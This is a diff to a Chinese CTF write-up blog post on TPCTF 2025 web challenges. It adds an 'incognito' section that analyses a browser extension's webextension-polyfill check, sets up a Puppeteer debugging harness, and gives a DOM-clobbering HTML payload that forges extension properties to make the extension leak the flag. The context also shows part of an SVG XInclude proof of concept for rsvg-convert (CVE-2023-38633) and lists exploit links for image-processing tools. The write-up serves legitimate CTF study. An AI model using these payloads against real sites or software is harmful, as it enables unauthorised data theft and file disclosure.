@@ -12,7 +12,6 @@ image:
   alt: TPCTF 2025 Web Challenges
 ---
 
-# Web
 
 ## baby layout
 
@@ -339,7 +338,7 @@ identify -list policy
         1. [heap-use-after-free in magick at dcm.c RelinquishDCMInfo · Issue #4947 · ImageMagick/ImageMagick](https://github.com/ImageMagick/ImageMagick/issues/4947)
 5. Ffmpeg 利用
 
-    1. [USN-6803-1: FFmpeg vulnerabilities | Ubuntu security notices | Ubuntu](https://ubuntu.com/security/notices/USN-6803-1)
+    1. [USN-6803-1: FFmpeg vulnerabilities - Ubuntu security notices - Ubuntu](https://ubuntu.com/security/notices/USN-6803-1)
 6. ExifTool 利用，目标版本是 11.88，似乎在适用版本内，但利用不成功
 
     1. [UNICORDev/exploit-CVE-2021-22204: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution](https://github.com/UNICORDev/exploit-CVE-2021-22204)
@@ -351,7 +350,7 @@ identify -list policy
         2. [CVE-2024-29510 - Exploiting Ghostscript using format strings — Codean Labs](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/)，文中提到：也可能是您的发行版提供的版本太旧（\< v9.50），因此也不容易受到此 CVE 的影响。
 8. Rsvg-convert 利用
 
-    1. [CVE-2023-38633 Common Vulnerabilities and Exposures | SUSE](https://www.suse.com/security/cve/CVE-2023-38633.html)
+    1. [CVE-2023-38633 Common Vulnerabilities and Exposures - SUSE](https://www.suse.com/security/cve/CVE-2023-38633.html)
     2. [When URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog](https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/)
 
 最终 poc：
@@ -370,4 +369,189 @@ identify -list policy
     </xi:include>
   </text>
 </svg>
+```
+
+## incognito (unsolved)
+```bash
+➜ tree /F
+文件夹 PATH 列表
+卷序列号为 561E-913B
+E:.
+│  .dockerignore
+│  docker-compose.yml
+│  Dockerfile
+│  _media_file_task_76eaa3eb-a4da-4ce4-aa02-ac690521faba.zip
+│
+├─bot
+│  │  index.js
+│  │  package.json
+│  │  pnpm-lock.yaml
+│  │  visit.js
+│  │
+│  └─public
+│          index.html
+│
+└─extension
+        content.js
+        manifest.json
+        package.json
+        pnpm-lock.yaml
+```
+题目提供了一个 bot，bot 额外安装了一个浏览器扩展(extension 目录)，该浏览器的扩展较为简单，当在隐私浏览模式下运行时，会向 /flag路径发送一个 POST 请求，请求中带上了 flag。
+
+扩展源码如下：当 browser.extension.inIncognitoContext 存在时，即可得到 flag。
+```js
+if (browser.extension.inIncognitoContext) {
+  fetch('/flag', {
+    method: 'POST',
+    body: 'fake{dummy}',
+  });
+} else {
+  console.log('No flag for you!');
+}
+```
+浏览器扩展依赖了一个叫做 webextension-polyfill 的第三方库。
+```json
+{
+  "private": true,
+  "dependencies": {
+    "webextension-polyfill": "^0.12.0"
+  }
+}
+```
+manifest.json 内容如下：
+```json
+{
+  "manifest_version": 3,
+  "name": "Are you incognito?",
+  "description": "Capture the flag in incognito mode.",
+  "version": "0.1.0",
+  "content_scripts": [
+    {
+      "matches": [
+        "<all_urls>"
+      ],
+      "js": [
+        "node_modules/webextension-polyfill/dist/browser-polyfill.min.js",
+        "content.js"
+      ]
+    }
+  ]
+}
+
+```
+
+在 bot 环境中，当 bot 访问用户提供的 URL 时，Puppeteer会加载扩展（通过--load-extension=/extension参数）
+，扩展系统会根据 manifest.json 的配置注入 content scripts 因此 browser-polyfill.min.js 会在每次 bot 访问页面时被加载。
+
+browser-polyfill.js 是 Mozilla 的 WebExtension Polyfill 库的核心文件，它的主要作用是在 Chrome 浏览器中提供与 Firefox 兼容的 Promise-based WebExtension API。
+
+> Promise-based WebExtension API 是一种现代化的浏览器扩展开发接口，它使用 JavaScript Promise 来处理异步操作，而不是传统的回调函数。这种 API 风格最初由 Firefox 引入，并逐渐成为浏览器扩展开发的推荐标准。W3C 浏览器扩展社区组正在努力标准化基于 Promise 的扩展 API。Firefox 已完全实现了 Promise-based API，Chrome 通过 Mozilla 的 webextension-polyfill 库可以使用这种 API 风格。
+
+因此，我们需要为 bot 提供一个链接，bot 在访问之后，如果 browser.extension.inIncognitoContext 通过校验，则会将 flag 发送到 /flag 路由。
+
+chrome 浏览器默认情况下是没有 browser 这个变量的，browser-polyfill.min.js 会将 `browser.*API` 映射到Chrome 的 `chrome.*API`
+
+### 调试环境搭建
+在本地 windows 中创建一个 debug 文件夹，编写 index.js，模拟 bot 的行为调用 pupeteer 访问远程服务。
+
+```bash
+npm init -y
+```
+index.js 内容如下，注意将 headless 设置为 false
+```js
+const puppeteer = require('puppeteer');
+
+const sleep = (ms) => new Promise((resolve) => {
+    setTimeout(resolve, ms);
+  });
+  
+async function debug(url){
+    console.log(`start: ${url}`);
+
+    const browser = await puppeteer.launch({
+      headless: false,
+      executablePath: 'chrome/win64-134.0.6998.35/chrome-win64/chrome.exe',
+      args: [
+        '--no-sandbox',
+        '--disable-dev-shm-usage',
+        '--disable-gpu',
+        '--js-flags="--noexpose_wasm"',
+        '--disable-extensions-except=E:\\work\\project\\ctf-archives\\TPCTF\\2025\\WEB\\incognito\\extension',
+        '--load-extension=E:\\work\\project\\ctf-archives\\TPCTF\\2025\\WEB\\incognito\\extension',
+      ],
+    });
+  
+    try {
+      const page = await browser.newPage();
+      await page.goto(url, { timeout: 5000, waitUntil: 'domcontentloaded' });
+    //   await sleep(5000);
+    //   await page.close();
+    } catch (err) {
+      console.error(err);
+    }
+  
+    // await browser.close();
+    console.log(`end: ${url}`);
+}
+
+debug("http://192.168.85.128:19006/");
+```
+可以使用下面的命令安装 chrome test 特定版本：
+- [Download Chromium](https://www.chromium.org/getting-involved/download-chromium/)
+```bash
+➜ npx @puppeteer/browsers install chrome@134.0.6998.35
+Downloading chrome 134.0.6998.35 - 166.5 MB [====================] 100% 0.0s
+chrome@134.0.6998.35 E:\work\project\ctf-archives\TPCTF\2025\WEB\incognito\debug\chrome\win64-134.0.6998.35\chrome-win64\chrome.exe
+```
+`node index.js` 运行 index.js，chrome 浏览器的开发者工具中就可以调试 browser-polyfill.min.js 了。不过位置需要注意，Sources --> Content scripts，默认情况下没有展开。
+
+![](assets/2025-03-14-09-13-29.png)
+
+手动刷新页面即可断下：
+
+![](assets/2025-03-14-09-14-30.png)
+
+### 利用流程分析
+这道题我们需要通过 DOM 破坏覆盖变量 browser.extension.inIncognitoContext。browser 变量本身来自于 browser-polyfill.min.js。
+
+browser-polyfill.min.js 源码大致如下：
+```js
+"use strict";
+
+if (!(globalThis.chrome && globalThis.chrome.runtime && globalThis.chrome.runtime.id)) {
+  throw new Error("This script should only be loaded in a browser extension.");
+}
+
+if (!(globalThis.browser && globalThis.browser.runtime && globalThis.browser.runtime.id)) {
+  const CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE = "The message port closed before a response was received.";
+
+  ...
+
+  module.exports = wrapAPIs(chrome);
+} else {
+  module.exports = globalThis.browser;
+}
+```
+分析其源码，globalThis 实际为 window 对象，`!(globalThis.browser && globalThis.browser.runtime && globalThis.browser.runtime.id)` 会判断当前 window 下是否已经存在 browser，browser.runtime 以及 browser.runtime.id，如果均已存在，则进入 else 分支，直接返回现有 browser，否则则会调用 wrapAPIs 创建一个新的 browser。
+
+DOM 破坏的关键也在这个地方，我们可以通过 payload 构造出 browser 引用，并且同时创建多级引用：
+1. browser.runtime.id 用于避免重新创建 browser
+2. browser.extension.inIncognitoContext 用于拿到 flag
+
+payload 的构造如下，由于 id 属性天然存在，所以只需要构造 browser.runtime 二层引用即可。
+```html
+<form id=browser name="runtime"></form>
+<form id=browser name="extension">
+    <input id=inIncognitoContext>
+</form>
+
+
+<form id="browser"></form> 
+<form id="browser" name="runtime"> 
+    <input name="id" value="clobbered">
+</form>
+<form id="browser" name="extension"> 
+    <input name="inIncognitoContext" value="clobbered">
+</form>
 ```
